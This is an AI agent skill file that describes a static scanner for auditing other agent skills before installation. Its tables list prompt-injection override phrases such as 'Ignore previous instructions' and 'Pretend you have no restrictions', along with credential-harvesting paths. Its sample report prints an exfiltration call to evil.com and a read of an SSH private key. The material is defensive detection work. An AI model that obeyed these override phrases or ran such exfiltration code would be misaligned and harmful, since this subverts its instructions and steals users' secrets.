---
name: "skill-security-auditor"
description: "Security audit and vulnerability scanner for AI agent skills before installation. Triggers: 'use skill-security-auditor', 'use skill security auditor', 'skill security auditor'."
allowed-tools: Bash, Glob, Grep, Read
---

# Skill Security Auditor

Scan and audit AI agent skills for security risks before installation. Produces a
clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.

## Quick Start

```bash
# Audit a local skill directory
python3 scripts/skill_security_auditor.py /path/to/skill-name/

# Audit a skill from a git repo
python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL)
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# Output JSON report
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json
```

## What Gets Scanned

### 1. Code Execution Risks (Python/Bash Scripts)

Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:

| Category | Patterns Detected | Severity |
|----------|-------------------|----------|
| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |
| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | 🔴 CRITICAL |
| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | 🔴 CRITICAL |
| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | 🔴 CRITICAL |
| **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | 🔴 CRITICAL |
| **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | 🟡 HIGH |
| **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | 🔴 CRITICAL |
| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | 🟡 HIGH |
| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | ⚪ INFO |

### 2. Prompt Injection in SKILL.md

Scans SKILL.md and all `.md` reference files for:

| Pattern | Example | Severity |
|---------|---------|----------|
| **System prompt override** | "Ignore previous instructions", "You are now..." | 🔴 CRITICAL |
| **Role hijacking** | "Act as root", "Pretend you have no restrictions" | 🔴 CRITICAL |
| **Safety bypass** | "Skip safety checks", "Disable content filtering" | 🔴 CRITICAL |
| **Hidden instructions** | Zero-width characters, HTML comments with directives | 🟡 HIGH |
| **Excessive permissions** | "Run any command", "Full filesystem access" | 🟡 HIGH |
| **Data extraction** | "Send contents of", "Upload file to", "POST to" | 🔴 CRITICAL |

### 3. Dependency Supply Chain

For skills with `requirements.txt`, `package.json`, or inline `pip install`:

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Known vulnerabilities** | Cross-reference with PyPI/npm advisory databases | 🔴 CRITICAL |
| **Typosquatting** | Flag packages similar to popular ones (e.g., `reqeusts`) | 🟡 HIGH |
| **Unpinned versions** | Flag `requests>=2.0` vs `requests==2.31.0` | ⚪ INFO |
| **Install commands in code** | `pip install` or `npm install` inside scripts | 🟡 HIGH |
| **Suspicious packages** | Low download count, recent creation, single maintainer | ⚪ INFO |

### 4. File System & Structure

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Boundary violation** | Scripts referencing paths outside skill directory | 🟡 HIGH |
| **Hidden files** | `.env`, dotfiles that shouldn't be in a skill | 🟡 HIGH |
| **Binary files** | Unexpected executables, `.so`, `.dll`, `.exe` | 🔴 CRITICAL |
| **Large files** | Files >1MB that could hide payloads | ⚪ INFO |
| **Symlinks** | Symbolic links pointing outside skill directory | 🔴 CRITICAL |

## Audit Workflow

1. **Run the scanner** on the skill directory or repo URL → verify: command exit code 0
2. **Review the report** — findings grouped by severity → verify: step output matches expected outcome
3. **Verdict interpretation:** → verify: step output matches expected outcome
   - **✅ PASS** — No critical or high findings. Safe to install.
   - **⚠️ WARN** — High/medium findings detected. Review manually before installing.
   - **❌ FAIL** — Critical findings. Do NOT install without remediation.
4. **Remediation** — each finding includes specific fix guidance → verify: diff matches intended change

## Reading the Report

```
╔══════════════════════════════════════════════╗
║  SKILL SECURITY AUDIT REPORT                ║
║  Skill: example-skill                        ║
║  Verdict: ❌ FAIL                            ║
╠══════════════════════════════════════════════╣
║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
╚══════════════════════════════════════════════╝

🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

🟡 HIGH [FS-BOUNDARY] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
   Risk: Reads SSH private key outside skill scope
   Fix: Remove filesystem access outside skill directory

⚪ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## Advanced Usage

### Audit a Skill from Git Before Cloning

```bash
# Clone to temp dir, audit, then clean up
python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
```

### CI/CD Integration

```yaml
# GitHub Actions step
- name: "audit-skill-security"
  run: |
    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

### Batch Audit

```bash
# Audit all skills in a directory
for skill in skills/*/; do
  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
done
```

## Threat Model Reference

For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](references/threat-model.md).

## Limitations

- Cannot detect logic bombs or time-delayed payloads with certainty
- Obfuscation detection is pattern-based — a sufficiently creative attacker may bypass it
- Network destination reputation checks require internet access
- Does not execute code — static analysis only (safe but less complete than dynamic analysis)
- Dependency vulnerability checks use local pattern matching, not live CVE databases

When in doubt after an audit, **don't install**. Ask the skill author for clarification.

## When NOT to use

- Task is unrelated to skill security auditor — pick a domain-specific skill instead
- Simple one-line operation that doesn't need this skill's structure
- User explicitly asks for raw output without skill discipline → respect override
- Different toolchain / framework required → search with `find-skills` for alternatives

## Red Flags

| Thought | Reality |
|---------|---------|
| "Output looks right, skip verify" | Eyeball checks miss edge cases — run the verify step |
| "Generic template is good enough" | Skill Security Auditor needs domain-specific judgment, not boilerplate |
| "I'll inline the context, no need to read references" | Context drift produces stale output; check linked references |
| "One more shortcut won't hurt" | Shortcuts compound — finish the discipline before declaring done |

## Output Contract

Done when:
- Primary deliverable produced matches user's stated goal for skill security auditor
- Every verify step in the process passed
- Edge cases addressed or explicitly flagged with assumption
- Output reproducible — no hidden state or one-time setup
- Brief hand-off summary so user can validate without rereading the full flow

## Examples

### Example 1 — golden path
- Input: standard user request involving skill security auditor
- Action: follow the documented numbered process with verify clauses at each step
- Output: deliverable matching the Output Contract above

### Example 2 — edge case
- Input: request with partial info, non-standard constraint, or conflicting requirements
- Action: detect the gap, surface a clarifying question OR document the assumption explicitly, then proceed with adapted process
- Output: deliverable + explicit note on the assumption/limitation taken
